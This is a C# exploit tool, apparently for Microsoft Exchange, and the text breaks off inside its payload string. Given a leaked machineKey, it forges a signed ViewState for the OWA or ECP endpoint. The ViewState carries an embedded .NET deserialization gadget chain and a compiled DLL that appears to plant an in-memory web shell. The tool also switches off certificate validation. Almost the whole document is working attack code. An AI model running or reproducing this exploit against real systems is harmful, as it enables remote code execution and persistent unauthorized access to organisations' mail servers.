using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Web;
using System.Globalization;
using System.Security.Cryptography.X509Certificates;

namespace SharpExchangeDeserializeShelltest
{

    public class Program
    {
        static byte[] strToHexByte(string hexString) 
        {             
            if ((hexString.Length % 2) != 0) 
                hexString += " "; 
            byte[] returnBytes = new byte[hexString.Length / 2]; 
            for (int i = 0; i < returnBytes.Length; i++) 
                returnBytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16); 
            return returnBytes; 
        }

        static string CreateViewState(byte[] dat,string generator,string key)
        {
            MemoryStream ms = new MemoryStream();    
            byte[] validationKey= strToHexByte(key);

            uint _clientstateid = 0;
            if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
            {
                System.Environment.Exit(0);
            }
 
            byte[] _mackey = new byte[4];
            _mackey[0] = (byte)_clientstateid;
            _mackey[1] = (byte)(_clientstateid >> 8);
            _mackey[2] = (byte)(_clientstateid >> 16);
            _mackey[3] = (byte)(_clientstateid >> 24);

            ms = new MemoryStream();
            ms.Write(dat,0,dat.Length);
            ms.Write(_mackey,0,_mackey.Length);
            byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
            ms=new MemoryStream();
            ms.Write(dat,0,dat.Length);
            ms.Write(hash,0,hash.Length);
            return Convert.ToBase64String(ms.ToArray());
        }

        public static void ShowUsage()
        {
            string Usage = @"
Use to test the deserializing code execution of Exchange.            

You should modify the machineKey in %ExchangeInstallPath%\FrontEnd\HttpProxy\<path>\web.config to implement deserializing code execution.
<path>:owa or ecp

Usage:
    <url> <key> <path>
<path>: owa or ecp

eg.    
    192.168.1.1 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF owa
    mail.test.com CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF ecp    

";
            Console.WriteLine(Usage);
        }

        public static void Main(string[] args)
        {

            if(args.Length!=3)
            {
                ShowUsage();
                System.Environment.Exit(0);
            }            
            try
            {            
                ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
                
                string targeturl = "";
                string generator = "";   
                if(args[2] =="owa")
                {
                    targeturl = "https://" + args[0] + "/owa/auth/errorFE.aspx";
                    generator = "042A94E8";

                }
                else if(args[2] =="ecp")
                {
                    targeturl = "https://" + args[0] + "/ecp/auth/TimeoutLogout.aspx";
                    generator = "277B1C2A";
                }
                else
                {
                    Console.WriteLine("[!] Wrong input");
                    System.Environment.Exit(0);
                }
                string key = args[1];
                Console.WriteLine("[*] TargetURL: " + targeturl);
                Console.WriteLine();                
            

                string xaml_payload2 = "/wEyiHkAAQAAAP////8BAAAAAAAAAAwCAAAAV1N5c3RlbS5XaW5kb3dzLkZvcm1zLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAIVN5c3RlbS5XaW5kb3dzLkZvcm1zLkF4SG9zdCtTdGF0ZQEAAAARUHJvcGVydHlCYWdCaW5hcnkHAgIAAAAJAwAAAA8DAAAAxzsAAAIAAQAAAP////8BAAAAAAAAAAQBAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgUAAAgICQIAAAAKAAAACgAAABACAAAAEAAAAAkDAAAACQQAAAAJBQAAAAkGAAAACQcAAAAJCAAAAAkJAAAACQoAAAAJCwAAAAkMAAAADQYHAwAAAAEBAAAAAQAAAAcCCQ0AAAAMDgAAAGFTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQQAAABqU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFH1N5c3RlbS5Vbml0eVNlcmlhbGl6YXRpb25Ib2xkZXIOAAAACQ8AAAAJEAAAAAEFAAAABAAAAAkRAAAACRIAAAABBgAAAAQAAAAJEwAAAAkUAAAAAQcAAAAEAAAACRUAAAAJFgAAAAEIAAAABAAAAAkXAAAACRgAAAABCQAAAAQAAAAJGQAAAAkaAAAAAQoAAAAEAAAACRsAAAAJHAAAAAELAAAABAAAAAkdAAAACR4AAAAEDAAAABxTeXN0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cgBTeXN0ZW0uV2ViLlJvdXRpbmcASVJvdXRlSGFuZGxlcgBTeXN0ZW0uV2ViLkhvc3RpbmcAVmlydHVhbFBhdGhQcm92aWRlcgBWaXJ0dWFsRmlsZQBWaXJ0dWFsRGlyZWN0b3J5AC5jdG9yAGdldF9Jc1JldXNhYmxlAEh0dHBDb250ZXh0AFByb2Nlc3NSZXF1ZXN0AFJlcXVlc3RDb250ZXh0AEdldEh0dHBIYW5kbGVyAElzUmV1c2FibGUAX3ZpcnR1YWxEaXIAX2ZpbGVDb250ZW50AEluaXRpYWxpemUASXNQYXRoVmlydHVhbABGaWxlRXhpc3RzAERpcmVjdG9yeUV4aXN0cwBHZXRGaWxlAEdldERpcmVjdG9yeQBTeXN0ZW0uV2ViLkNhY2hpbmcAQ2FjaGVEZXBlbmRlbmN5AFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51bWVyYWJsZQBEYXRlVGltZQBHZXRDYWNoZURlcGVuZGVuY3kAZ2V0X0V4aXN0cwBTeXN0ZW0uSU8AU3RyZWFtAE9wZW4ARXhpc3RzAEFycmF5TGlzdABjaGlsZHJlbgBnZXRfQ2hpbGRyZW4AZGlyZWN0b3JpZXMAZ2V0X0RpcmVjdG9yaWVzAGZpbGVzAGdldF9GaWxlcwBDaGlsZHJlbgBEaXJlY3RvcmllcwBGaWxlcwBjb250ZXh0AHJlcXVlc3RDb250ZXh0AHZpcnR1YWxEaXIAZmlsZUNvbnRlbnQAdmlydHVhbFBhdGgAdmlydHVhbFBhdGhEZXBlbmRlbmNpZXMAdXRjU3RhcnQAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlADV0ZGZ1MXZwAFN5c3RlbS5UZXh0AEVuY29kaW5nAGdldF9VVEY4AENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAZ2V0X0N1cnJlbnQASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAZ2V0X0N1cnJlbnRFeGVjdXRpb25GaWxlUGF0aABDaGFyAFN0cmluZwBUcmltRW5kAFRvTG93ZXIAZ2V0X0FwcGxpY2F0aW9uUGF0aABJbmRleE9mAGdldF9MZW5ndGgAUmVtb3ZlAExhc3RJbmRleE9mAFN1YnN0cmluZwBDb25jYXQAUmVwbGFjZQBNYXJzaGFsQnlSZWZPYmplY3QASW5pdGlhbGl6ZUxpZmV0aW1lU2VydmljZQBTeXN0ZW0uV2ViLkNvbXBpbGF0aW9uAEJ1aWxkTWFuYWdlcgBnZXRfSXNQcmVjb21waWxlZEFwcABUeXBlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAFN5c3RlbS5SZWZsZWN0aW9uAEZpZWxkSW5mbwBCaW5kaW5nRmxhZ3MAR2V0RmllbGQAR2V0VmFsdWUAQm9vbGVhbgBTZXRWYWx1ZQBIb3N0aW5nRW52aXJvbm1lbnQAUmVnaXN0ZXJWaXJ0dWFsUGF0aFByb3ZpZGVyAG9wX0luZXF1YWxpdHkASHR0cFJlc3BvbnNlAGdldF9SZXNwb25zZQBDbGVhcgBzZXRfQnVmZmVyT3V0cHV0AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAUmFuZG9tAE5leHQASW50MzIARXhlY3V0ZQBFbmQAVG9TdHJpbmcASHR0cFV0aWxpdHkAVXJsRW5jb2RlAEFkZEhlYWRlcgBFeGNlcHRpb24AVmlydHVhbFBhdGhVdGlsaXR5AFRvQXBwUmVsYXRpdmUAQ29udGFpbnMAZ2V0X1ByZXZpb3VzAEdldEJ5dGVzAE1lbW9yeVN0cmVhbQBJc051bGxPckVtcHR5AEFkZAAAghlQAEMAVgBBAEkARgBCAGgAWgAyAFUAZwBUAEcARgB1AFoAMwBWAGgAWgAyAFUAOQBJAGsAcAB6AFkAMwBKAHAAYwBIAFEAaQBKAFQANAA4AEoAUQBwAHAAWgBpAGgAUwBaAFgARgAxAFoAWABOADAATABrAGgAbABZAFcAUgBsAGMAbgBOAGIASQBsAFoAaABiAEgAVgBsAEkAbAAwADkAUABTAEkAdwBNAEUAaABIAFEAVgBRAHoAUwB6AEIAQgBXAEUAaABXAE0AbABKAEcATQBsAGMAdwBSAHkASQBwAEMAbgBzAEsAWgBYAFoAaABiAEMAaABTAFoAWABGADEAWgBYAE4AMABMAGsAbAAwAFoAVwAxAGIASQBtAEYAdQBkAEgATgAzAGIAMwBK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NTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAGIgAAAE5TeXN0ZW0uQ29yZSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQEAAAAAcAAAAJAwAAAAoJJAAAAAoICAAAAAAKCAgBAAAAAREAAAAPAAAABiUAAAD1AlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQEgAAAAcAAAAJBAAAAAoJKAAAAAoICAAAAAAKCAgBAAAAARMAAAAPAAAABikAAADfA1N5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBQAAAAHAAAACQUAAAAKCSwAAAAKCAgAAAAACggIAQAAAAEVAAAADwAAAAYtAAAA5gJTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBYAAAAHAAAACQYAAAAJMAAAAAkxAAAACggIAAAAAAoICAEAAAABFwAAAA8AAAAGMgAAAO8BU3lzdGVtLkxpbnEuRW51bW